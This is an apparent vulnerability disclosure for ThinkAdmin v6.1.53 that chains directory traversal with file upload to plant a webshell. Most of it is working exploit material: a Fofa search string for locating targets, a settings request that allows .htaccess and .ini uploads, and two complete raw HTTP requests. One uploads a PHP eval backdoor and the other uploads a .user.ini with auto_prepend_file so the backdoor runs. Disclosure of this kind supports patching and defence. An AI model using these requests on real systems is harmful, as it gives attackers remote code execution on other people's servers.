ThinkAdmin directory traversal+file upload getshell



Project Introduction

ThinkAdmin is a product that follows [MIT]（ https://mit-license.org/ ）Protocol open source rapid development framework, based on the latest version of  ThinkPHP6 , a minimalist backend management system (compatible with ThinkPHP8)

Official website: https://thinkadmin.top/



Audit version: ThinkAdmin Version v6.1.53
![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps1.jpg)

 

Fofa : body="/admin/api.plugs/script"
![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps2.jpg)

Vulnerability: Directory traversal+file upload=getshell
Install Composer on the official website
After installation, log in and enter the background
Firstly, set the uploadable suffix for the backend

![image-20231116184032885](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184032885.png)

http://localhost/admin/config/storage.html?spm=m-1-2-3
param：storage%5Bname_type%5D=xmd5&storage%5Blink_type%5D=none&storage%5Ballow_exts%5D=doc%2Cgif%2Cico%2Cjpg%2Cmp3%2Cmp4%2Cp12%2Cpem%2Cpng%2Czip%2Crar%2Cxls%2Cxlsx%2Chtaccess%2Cini&storage%5Blocal_http_protocol%5D=follow&storage%5Blocal_http_domain%5D=&storage%5Btype%5D=local

![image-20231116184045081](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184045081.png)

First upload a Trojan with any file content as webshell

`POST /admin/api.upload/file HTTP/1.1

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCUB3l9pNDT4UzMSU

Cookie: user cookie

Host: IP：PORT

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="key"

 

..\./1.zip

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="safe"

 

0

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="uptype"

 

local

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="file"; filename="1.zip"

Content-Type: image/png

 

<?php @eval($_POST[1]);?>

------WebKitFormBoundary3VyVEPpvQynFo76H--`

![image-20231116184205379](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184205379.png)

Construct Payload Upload

http://localhost/admin/api.upload/file

`POST /admin/api.upload/file HTTP/1.1

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCUB3l9pNDT4UzMSU

Cookie: user cookie

Host: IP：PORT

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="key"

 

..\./.user.ini

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="safe"

 

0

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="uptype"

 

local

------WebKitFormBoundary3VyVEPpvQynFo76H

Content-Disposition: form-data; name="file"; filename="1.ini"

Content-Type: image/png

 

auto_prepend_file=1.zip

------WebKitFormBoundary3VyVEPpvQynFo76H--`

![image-20231116184237606](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184237606.png)

![image-20231116184242352](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184242352.png)

You can see that everything has been uploaded successfully

![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps3.jpg) 

 

Webshell also successfully parsed